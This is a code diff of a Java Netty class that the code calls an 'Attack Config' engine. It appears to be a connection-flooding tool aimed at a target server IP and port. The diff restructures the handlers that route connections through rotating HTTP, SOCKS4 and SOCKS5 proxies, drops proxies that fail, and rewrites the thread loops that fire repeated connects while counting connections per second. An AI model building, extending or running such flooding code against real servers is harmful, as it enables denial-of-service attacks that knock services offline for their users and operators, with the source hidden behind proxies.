@@ -17,19 +17,18 @@ import io.netty.util.ResourceLeakDetector;
 import org.jetbrains.annotations.NotNull;
 
 import java.net.InetSocketAddress;
-import java.util.concurrent.Executor;
+import java.util.Objects;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ThreadFactory;
-import java.util.concurrent.atomic.AtomicInteger;
-import java.util.stream.IntStream;
 
 public class NettyBootstrap {
-    public static Class<? extends Channel> socketChannel;
     public final int protocolID;
     public final String srvIp;
     public final int port;
 
+    // Netty related
+    public static Class<? extends Channel> socketChannel;
     private final ChannelHandler TAIL = new ChannelHandler() {
         @Override
         public void handlerAdded(ChannelHandlerContext ctx) {
@@ -46,17 +45,121 @@ public class NettyBootstrap {
             ctx.close();
         }
     };
-    // Netty related
+    // ChannelInitializer with HTTP proxy
+    private final ChannelInitializer<Channel> HTTP = new ChannelInitializer<>() {
+        @Override
+        public void channelInactive(@NotNull ChannelHandlerContext ctx) {
+            ctx.channel().close();
+        }
+
+        @Override
+        protected void initChannel(final @NotNull Channel c) {
+            try {
+                final Proxy proxy = builder.proxyManager.getProxy();
+                final HttpProxyHandler s = (proxy.requiresAuthentication()) ? new HttpProxyHandler(proxy.getAddress(), proxy.getEmail(), proxy.getPassword()) : new HttpProxyHandler(proxy.getAddress());
+                s.setConnectTimeoutMillis(5000L);
+                s.connectFuture().addListener(f -> {
+                    if (f.isSuccess() && s.isConnected()) {
+                        triedCPS++;
+                        builder.method.accept(c, proxy);
+                    } else {
+                        builder.proxyManager.removeProxy(proxy);
+                        c.close();
+                    }
+                });
+                c.pipeline().addFirst(s).addLast(TAIL);
+            } catch (Exception e) {
+                c.close();
+            }
+        }
+
+        @Override
+        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
+            ctx.close();
+        }
+    };
+    // ChannelInitializer with SOCKS4 proxy
+    private final ChannelInitializer<Channel> SOCKS4 = new ChannelInitializer<>() {
+        @Override
+        public void channelInactive(@NotNull ChannelHandlerContext ctx) {
+            ctx.channel().close();
+        }
+
+        @Override
+        protected void initChannel(final @NotNull Channel c) {
+            try {
+                final Proxy proxy = builder.proxyManager.getProxy();
+                final Socks4ProxyHandler s;
+                if (proxy.requiresAuthentication()) {
+                    s = new Socks4ProxyHandler(proxy.getAddress(), proxy.getEmail());
+                } else {
+                    s = new Socks4ProxyHandler(proxy.getAddress());
+                }
+                s.setConnectTimeoutMillis(5000L);
+                s.connectFuture().addListener(f -> {
+                    if (f.isSuccess() && s.isConnected()) {
+                        triedCPS++;
+                        builder.method.accept(c, proxy);
+                    } else {
+                        builder.proxyManager.removeProxy(proxy);
+                        c.close();
+                    }
+                });
+                c.pipeline().addFirst(s).addLast(TAIL);
+            } catch (Exception e) {
+                c.close();
+            }
+        }
+
+        @Override
+        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
+            ctx.close();
+        }
+    };
+    // ChannelInitializer with SOCKS5 proxy
+    private final ChannelInitializer<Channel> SOCKS5 = new ChannelInitializer<>() {
+        @Override
+        public void channelInactive(ChannelHandlerContext ctx) {
+            ctx.channel().close();
+        }
+
+        @Override
+        protected void initChannel(final @NotNull Channel c) {
+            try {
+                final Proxy proxy = builder.proxyManager.getProxy();
+                final Socks5ProxyHandler s = (proxy.requiresAuthentication()) ? new Socks5ProxyHandler(proxy.getAddress(), proxy.getEmail(), proxy.getPassword()) : new Socks5ProxyHandler(proxy.getAddress());
+                s.setConnectTimeoutMillis(5000L);
+                s.connectFuture().addListener(f -> {
+                    if (f.isSuccess() && s.isConnected()) {
+                        triedCPS++;
+                        builder.method.accept(c, proxy);
+                    } else {
+                        builder.proxyManager.removeProxy(proxy);
+                        c.close();
+                    }
+                });
+                c.pipeline().addFirst(s).addLast(TAIL);
+            } catch (Exception e) {
+                c.close();
+            }
+        }
+
+        @Override
+        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
+            ctx.close();
+        }
+    };
     private final EventLoopGroup eventLoopGroup;
     // BOOTSTRAP
     private final Bootstrap BOOTSTRAP;
+    public Builder builder;
+    //CPS AND STUFF
     public volatile int triedCPS = 0;
     public volatile int openedCPS = 0;
     public volatile int successfulCPS = 0;
-    public volatile int totalCPS = 0;
+    public volatile int totalConnections = 0;
     public volatile int averageCPS = 0;
     public boolean shouldStop = false;
-    public Builder builder;
 
     /**
      * @param builder Attack Config
@@ -67,7 +170,7 @@ public class NettyBootstrap {
         this.protocolID = builder.protocolID;
         this.builder = builder;
         socketChannel = builder.usingEpoll ? EpollSocketChannel.class : NioSocketChannel.class;
-
+        this.builder.method.init(this);
 
         ThreadFactory threadFactory = r -> {
             Thread t = new Thread(r);
@@ -77,108 +180,7 @@ public class NettyBootstrap {
         };
 
         eventLoopGroup = builder.usingEpoll ? new EpollEventLoopGroup(builder.workerThreads, threadFactory) : new NioEventLoopGroup(builder.workerThreads, threadFactory);
-
-        //
         BOOTSTRAP = new Bootstrap().channel(socketChannel).group(eventLoopGroup).option(ChannelOption.TCP_NODELAY, Boolean.TRUE).option(ChannelOption.AUTO_READ, Boolean.TRUE);
-        // ChannelInitializer with HTTP proxy
-        ChannelInitializer<Channel> HTTP = new ChannelInitializer<>() {
-            @Override
-            public void channelInactive(@NotNull ChannelHandlerContext ctx) {
-                ctx.channel().close();
-            }
-
-            @Override
-            protected void initChannel(final @NotNull Channel c) {
-                try {
-                    final Proxy proxy = builder.proxyManager.getProxy();
-                    final HttpProxyHandler s = (proxy.requiresAuthentication()) ? new HttpProxyHandler(proxy.getAddress(), proxy.getEmail(), proxy.getPassword()) : new HttpProxyHandler(proxy.getAddress());
-                    s.setConnectTimeoutMillis(5000L);
-                    s.connectFuture().addListener(f -> {
-                        if (f.isSuccess() && s.isConnected()) {
-                            triedCPS++;
-                            builder.method.accept(c, proxy);
-                        } else {
-                            builder.proxyManager.removeProxy(proxy);
-                            c.close();
-                        }
-                    });
-                    c.pipeline().addFirst(s).addLast(TAIL);
-                } catch (Exception e) {
-                    c.close();
-                }
-            }
-
-            @Override
-            public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
-                ctx.close();
-            }
-        };
-        // ChannelInitializer with SOCKS4 proxy
-        ChannelInitializer<Channel> SOCKS4 = new ChannelInitializer<>() {
-            @Override
-            public void channelInactive(@NotNull ChannelHandlerContext ctx) {
-                ctx.channel().close();
-            }
-
-            @Override
-            protected void initChannel(final @NotNull Channel c) {
-                try {
-                    final Proxy proxy = builder.proxyManager.getProxy();
-                    final Socks4ProxyHandler s = (proxy.requiresAuthentication()) ? new Socks4ProxyHandler(proxy.getAddress(), proxy.getEmail()) : new Socks4ProxyHandler(proxy.getAddress());
-                    s.setConnectTimeoutMillis(5000L);
-                    s.connectFuture().addListener(f -> {
-                        if (f.isSuccess() && s.isConnected()) {
-                            triedCPS++;
-                            builder.method.accept(c, proxy);
-                        } else {
-                            builder.proxyManager.removeProxy(proxy);
-                            c.close();
-                        }
-                    });
-                    c.pipeline().addFirst(s).addLast(TAIL);
-                } catch (Exception e) {
-                    c.close();
-                }
-            }
-
-            @Override
-            public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
-                ctx.close();
-            }
-        };
-        // ChannelInitializer with SOCKS5 proxy
-        ChannelInitializer<Channel> SOCKS5 = new ChannelInitializer<>() {
-            @Override
-            public void channelInactive(ChannelHandlerContext ctx) {
-                ctx.channel().close();
-            }
-
-            @Override
-            protected void initChannel(final @NotNull Channel c) {
-                try {
-                    final Proxy proxy = builder.proxyManager.getProxy();
-                    final Socks5ProxyHandler s = (proxy.requiresAuthentication()) ? new Socks5ProxyHandler(proxy.getAddress(), proxy.getEmail(), proxy.getPassword()) : new Socks5ProxyHandler(proxy.getAddress());
-                    s.setConnectTimeoutMillis(5000L);
-                    s.connectFuture().addListener(f -> {
-                        if (f.isSuccess() && s.isConnected()) {
-                            triedCPS++;
-                            builder.method.accept(c, proxy);
-                        } else {
-                            builder.proxyManager.removeProxy(proxy);
-                            c.close();
-                        }
-                    });
-                    c.pipeline().addFirst(s).addLast(TAIL);
-                } catch (Exception e) {
-                    c.close();
-                }
-            }
-
-            @Override
-            public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
-                ctx.close();
-            }
-        };
 
         switch (builder.proxyType) {
             case SOCKS4 -> BOOTSTRAP.handler(SOCKS4);
@@ -191,34 +193,42 @@ public class NettyBootstrap {
     public void start() {
         ResourceLeakDetector.setLevel(ResourceLeakDetector.Level.SIMPLE);
 
-        Thread Counter;
-        Counter = new Thread(() -> {
+        new Thread(() -> {
             int elapsed = 0;
             while (!shouldStop) {
                 elapsed++;
                 if (elapsed > builder.duration) {
                     shouldStop = true;
                     NettyBootstrap.this.stop();
-                    break;
                 }
                 try {
                     Thread.sleep(1000);
                 } catch (InterruptedException ignored) {
                 }
-                totalCPS += successfulCPS;
+                totalConnections += openedCPS;
                 openedCPS = 0;
                 successfulCPS = 0;
                 triedCPS = 0;
-                averageCPS = totalCPS / elapsed;
+                averageCPS = totalConnections / elapsed;
+                System.out.println(averageCPS);
             }
-        });
+        }).start();
 
-        Counter.start();
-        ExecutorService executor = Executors.newFixedThreadPool(builder.connectLoopThreads);
         for (int i = 0; i < builder.connectLoopThreads; i++) {
-            executor.execute(connectLoopThread::new);
+            new Thread(() -> {
+                final InetSocketAddress addr = new InetSocketAddress(builder.srvIp, builder.port);
+                while (!shouldStop) {
+                    for (int j = 0; j < builder.perDelay; j++) {
+                        BOOTSTRAP.connect(addr);
+                    }
+                    try {
+                        Thread.sleep(builder.delay);
+                    } catch (InterruptedException e) {
+                        throw new RuntimeException(e);
+                    }
+                }
+            }).start();
         }
-        executor.shutdown();
     }
 
     public void stop() {
@@ -294,26 +304,6 @@ public class NettyBootstrap {
 
         public NettyBootstrap build() {
             return new NettyBootstrap(this);
-        }
-    }
-
-    private class connectLoopThread implements Runnable {
-
-        //Better work outside the loop
-        final InetSocketAddress addr = new InetSocketAddress(builder.srvIp, builder.port);
-
-        @Override
-        public void run() {
-            while (!shouldStop) {
-                for (int j = 0; j < builder.perDelay; j++) {
-                    BOOTSTRAP.connect(addr);
-                }
-                try {
-                    Thread.sleep(builder.delay);
-                } catch (InterruptedException e) {
-                    throw new RuntimeException(e);
-                }
-            }
         }
     }
 }
